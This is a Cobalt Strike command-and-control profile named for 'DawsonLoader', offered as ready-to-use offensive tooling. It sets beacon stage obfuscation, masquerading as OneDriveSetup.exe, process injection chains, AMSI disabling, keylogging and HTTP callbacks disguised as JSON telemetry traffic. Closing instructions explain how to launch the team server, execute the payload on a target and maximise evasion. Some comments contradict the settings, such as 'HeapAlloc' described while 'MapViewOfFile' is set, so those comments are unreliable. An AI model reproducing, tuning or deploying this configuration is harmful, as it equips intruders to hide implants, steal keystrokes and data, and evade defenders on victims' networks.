#
# Dawson-Loader Stealth Profile
# Advanced Cobalt Strike C2 profile optimized for evasion with DawsonLoader
# Uses DLL stomping, memory obfuscation, and realistic HTTP traffic
#

set sample_name "Dawson Stealth Profile";

set sleeptime "45000";     # 45 second sleep
set jitter    "30";        # 30% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0";

set host_stage "false";    # Stageless only for OPSEC

# ============================
# STAGE - DLL STOMPING MODE
# ============================
stage {
    set userwx        "false";     # RW/RX only (more evasive)
    set obfuscate     "true";      # Obfuscate stage
    set cleanup       "true";      # Clean up loader after use
    set smartinject   "true";      # Smart process injection

    # Memory allocation method
    # HeapAlloc is more reliable and compatible with jopcall integration
    # Uses Windows heap API instead of direct syscalls
    set allocator     "MapViewOfFile"; # Most reliable for jopcall integration

    # Recommended DLLs for stomping (uncomment for allocator 0x4):
    # set module_x64 "wwanmm.dll";       # Windows WWAN Media Manager
    # set module_x64 "wlanapi.dll";      # WLAN API
    # set module_x64 "winhttp.dll";      # Windows HTTP Services

    # Stage obfuscation
    transform-x64 {
        strrep "ReflectiveLoader" "WindowsService01";
        strrep "beacon.x64.dll" "kernel32.x.dll";
        prepend "\x90\x90\x90\x90";    # NOP sled
    }

    # String replacements (obfuscate strings in beacon)
    stringw "kernel32.dll";
    stringw "ntdll.dll";
    stringw "msvcrt.dll";
    stringw "advapi32.dll";

    # PE/COFF customization
    set checksum        "0";
    set compile_time    "15 Nov 2023 08:22:44";
    set entry_point     "170000";
    set image_size_x86  "6586368";
    set image_size_x64  "6586368";
    set name            "OneDriveSetup.exe";
    set rich_header     "";
}

# ============================
# PROCESS INJECTION - EVASIVE
# ============================
process-inject {
    set allocator "NtMapViewOfSection";  # Use NT API directly
    set min_alloc "24576";                # Minimum allocation size
    set startrwx  "false";                # Never start with RWX
    set userwx    "false";                # Never use RWX

    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }

    # Injection methods (order matters - tries each in sequence)
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

# ============================
# POST-EXPLOITATION - OPSEC
# ============================
post-ex {
    # Spawn into legitimate processes
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";

    set obfuscate   "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger   "GetAsyncKeyState";

    # OPSEC: Pipe name randomization
    set pipename "msagent_##";
}

# ============================
# HTTP GET - REALISTIC TRAFFIC
# ============================
http-get {
    # Mimic legitimate API endpoints
    set uri "/v1/telemetry /v1/events /v1/metrics /api/health /api/status";

    client {
        header "Accept" "application/json";
        header "Accept-Encoding" "gzip, deflate";

        # Metadata in Cookie (common in legitimate apps)
        metadata {
            base64url;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "cloudflare";
        header "Cache-Control" "no-cache";

        # JSON response format
        output {
            base64url;
            prepend "{\"status\":\"success\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

# ============================
# HTTP POST - REALISTIC UPLOAD
# ============================
http-post {
    set uri "/v1/submit /v1/upload /v1/sync";
    set verb "POST";

    client {
        header "Accept" "application/json";
        header "Content-Type" "application/json";

        # Session ID in Cookie
        id {
            base64url;
            prepend "SESSIONID=";
            header "Cookie";
        }

        # Data in JSON POST body
        output {
            base64url;
            prepend "{\"data\":\"";
            append "\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "cloudflare";

        output {
            base64url;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

# ============================
# HTTP STAGER
# ============================
http-stager {
    set uri_x86 "/assets/js/app.32.min.js";
    set uri_x64 "/assets/js/app.64.min.js";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Referer" "https://example.com/";
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Server" "cloudflare";
        header "Cache-Control" "public, max-age=31536000, immutable";
        header "X-Content-Type-Options" "nosniff";

        output {
            print;
        }
    }
}

# ============================
# HTTPS CERTIFICATE
# ============================
https-certificate {
    set CN       "api.example.com";
    set O        "Example Corporation";
    set C        "US";
    set L        "San Francisco";
    set ST       "California";
    set validity "365";
}

# ============================
# USAGE INSTRUCTIONS
# ============================
# 1. Start Cobalt Strike team server with this profile:
#    ./teamserver <IP> <password> dawson-stealth.profile
#
# 2. Connect Cobalt Strike client and load scripts:
#    - Script Manager → Load → dist/DawsonLoader.cna
#    - (Optional) Script Manager → Load → sleepmask.cna
#
# 3. Generate stageless payload:
#    - Attacks → Packages → Windows Stageless Payload
#    - Select x64, EXE format
#    - Listener: Choose HTTPS listener
#
# 4. Deploy and test:
#    - Execute payload on target
#    - Beacon should call back using jopcall-obfuscated syscalls
#    - HTTP traffic mimics legitimate API calls
#
# 5. Verify jopcall is working:
#    - Attach WinDbg to beacon process
#    - Run: ~* k (show all call stacks)
#    - Syscall return addresses should point to ntdll, not beacon memory
#
# 6. OPSEC considerations:
#    - This profile uses HeapAlloc by default (more evasive than VirtualAlloc)
#    - All memory operations avoid RWX permissions
#    - HTTP traffic mimics legitimate web application patterns
#    - For maximum evasion, test with DLL stomping (uncomment module_x64)
